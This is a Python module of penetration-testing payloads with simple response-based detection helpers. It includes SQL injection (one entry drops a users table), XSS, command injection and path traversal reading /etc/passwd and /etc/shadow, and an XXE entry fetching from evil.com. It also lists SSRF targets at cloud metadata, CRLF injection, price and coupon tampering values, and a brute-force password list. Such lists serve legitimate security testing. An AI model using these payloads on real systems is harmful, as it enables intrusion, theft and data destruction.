"""
Security Testing Payloads

Collection of attack payloads for penetration testing.
These payloads are used to test for common vulnerabilities.

⚠️ WARNING: Only use these payloads on authorized systems!
"""

# SQL Injection Payloads
SQL_INJECTION_PAYLOADS = [
    # Basic SQL Injection
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin'--",
    "' OR 'x'='x",

    # UNION-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL--",
    "' UNION ALL SELECT NULL--",

    # Boolean-based blind
    "' AND '1'='1",
    "' AND '1'='2",
    "1' AND '1'='1",

    # Time-based blind
    "'; WAITFOR DELAY '00:00:05'--",
    "' OR SLEEP(5)--",
    "'; SELECT SLEEP(5)--",

    # Error-based
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "' AND 1=1/0--",

    # Stacked queries
    "'; DROP TABLE users--",
    "'; INSERT INTO users VALUES('hacker', 'password')--",
]

# XSS (Cross-Site Scripting) Payloads
XSS_PAYLOADS = [
    # Basic script injection
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",

    # Event handlers
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",

    # JavaScript protocol
    "javascript:alert('XSS')",
    "javascript:alert(1)",

    # HTML5 tags
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<embed src='javascript:alert(\"XSS\")'>",
    "<object data='javascript:alert(\"XSS\")'>",

    # Encoded payloads
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",

    # Filter bypass
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "<img src=x onerror=\"alert('XSS')\">",
    "<svg/onload=alert('XSS')>",
]

# Command Injection Payloads
COMMAND_INJECTION_PAYLOADS = [
    # Unix/Linux
    "; ls -la",
    "| ls -la",
    "& ls -la",
    "`ls -la`",
    "$(ls -la)",

    # System info
    "; whoami",
    "| cat /etc/passwd",
    "& id",
    "`uname -a`",
    "$(cat /etc/passwd)",

    # Command chaining
    "; ls -la; whoami; id",
    "&& cat /etc/passwd",
    "|| echo 'vulnerable'",

    # Windows
    "& dir",
    "| type C:\\Windows\\win.ini",
    "& type C:\\boot.ini",
]

# Path Traversal Payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../../../../etc/passwd",
    "..\\..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    "../../../../../../etc/shadow",
]

# LDAP Injection Payloads
LDAP_INJECTION_PAYLOADS = [
    "*",
    "*)(&",
    "*))%00",
    "admin)(&))",
    "admin)(|(password=*))",
]

# XML Injection / XXE Payloads
XXE_PAYLOADS = [
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]>
<foo>&xxe;</foo>""",
]

# SSRF (Server-Side Request Forgery) Payloads
SSRF_PAYLOADS = [
    "http://localhost",
    "http://127.0.0.1",
    "http://0.0.0.0",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://metadata.google.internal/",  # GCP metadata
    "file:///etc/passwd",
    "http://localhost:3306",  # MySQL
    "http://localhost:6379",  # Redis
    "http://localhost:5432",  # PostgreSQL
]

# NoSQL Injection Payloads (MongoDB, etc.)
NOSQL_INJECTION_PAYLOADS = [
    "{'$gt': ''}",
    "{'$ne': null}",
    "{'$regex': '.*'}",
    "admin' || '1'=='1",
    "';return true;var x='",
]

# CRLF Injection Payloads (Header Injection)
CRLF_INJECTION_PAYLOADS = [
    "%0d%0aSet-Cookie: admin=true",
    "\r\nSet-Cookie: admin=true",
    "%0ASet-Cookie: admin=true",
    "\nSet-Cookie: admin=true",
]

# E-Commerce Specific Payloads

# Price Manipulation
PRICE_MANIPULATION_PAYLOADS = [
    "0.01",
    "-100",
    "0",
    "999999999",
    "-1",
    "null",
    "undefined",
]

# Quantity Manipulation
QUANTITY_MANIPULATION_PAYLOADS = [
    "-1",
    "-999",
    "0",
    "999999999",
    "2147483648",  # Integer overflow (32-bit)
    "null",
    "undefined",
]

# Coupon/Promo Code Fuzzing
COMMON_COUPON_CODES = [
    "SAVE10",
    "SAVE20",
    "WELCOME",
    "WELCOME10",
    "WELCOME20",
    "PROMO",
    "PROMO2024",
    "PROMO2025",
    "PROMO2026",
    "DISCOUNT",
    "DISCOUNT10",
    "DISCOUNT20",
    "TEST",
    "TESTCODE",
    "FREE",
    "FREESHIP",
    "FREESHIPPING",
]

# Common weak passwords for brute-force testing
COMMON_PASSWORDS = [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "abc123",
    "monkey",
    "1234567",
    "letmein",
    "trustno1",
    "dragon",
    "baseball",
    "111111",
    "iloveyou",
    "master",
    "sunshine",
    "ashley",
    "bailey",
    "passw0rd",
    "shadow",
    "123123",
    "654321",
    "superman",
    "qazwsx",
    "michael",
    "Football",
]

# SQL Error Messages (für Detection)
SQL_ERROR_PATTERNS = [
    "SQL syntax error",
    "mysql_fetch",
    "mysqli",
    "PDOException",
    "SQLSTATE",
    "syntax error at or near",
    "ORA-",  # Oracle
    "Microsoft SQL Native Client error",
    "Unclosed quotation mark",
    "quoted string not properly terminated",
]

# Command Injection Error Messages
COMMAND_ERROR_PATTERNS = [
    "root:x:0:0",  # /etc/passwd
    "uid=",  # id/whoami output
    "total ",  # ls output
    "bin/bash",
    "sh: ",
    "command not found",
]

# Path Traversal Success Indicators
PATH_TRAVERSAL_SUCCESS_PATTERNS = [
    "root:x:0:0",  # /etc/passwd
    "[extensions]",  # Windows .ini files
    "for 16-bit app support",
]


def get_payload_description(payload: str) -> str:
    """
    Returns a human-readable description of what the payload tests.

    Args:
        payload: The attack payload

    Returns:
        Description string
    """
    descriptions = {
        "' OR '1'='1": "Basic SQL injection (authentication bypass)",
        "<script>alert('XSS')</script>": "Basic stored/reflected XSS",
        "; ls -la": "Command injection (Unix)",
        "../../../../../etc/passwd": "Path traversal (Unix)",
        "http://localhost": "SSRF to localhost",
        "-1": "Negative value injection",
    }

    return descriptions.get(payload, "Generic attack payload")


def is_vulnerability_detected(content: str, payload_type: str) -> tuple[bool, str]:
    """
    Checks if response content indicates a successful exploit.

    Args:
        content: Response content to analyze
        payload_type: Type of payload ('sql', 'xss', 'command', etc.)

    Returns:
        Tuple of (is_vulnerable, detection_message)
    """
    content_lower = content.lower()

    if payload_type == "sql":
        for pattern in SQL_ERROR_PATTERNS:
            if pattern.lower() in content_lower:
                return True, f"SQL error detected: {pattern}"

    elif payload_type == "command":
        for pattern in COMMAND_ERROR_PATTERNS:
            if pattern in content:
                return True, f"Command execution detected: {pattern}"

    elif payload_type == "path_traversal":
        for pattern in PATH_TRAVERSAL_SUCCESS_PATTERNS:
            if pattern in content:
                return True, f"Path traversal successful: {pattern}"

    elif payload_type == "xss":
        # XSS usually detected via dialog handlers, not content
        if "<script>" in content or "onerror=" in content_lower:
            return True, "Unescaped XSS payload detected"

    return False, ""
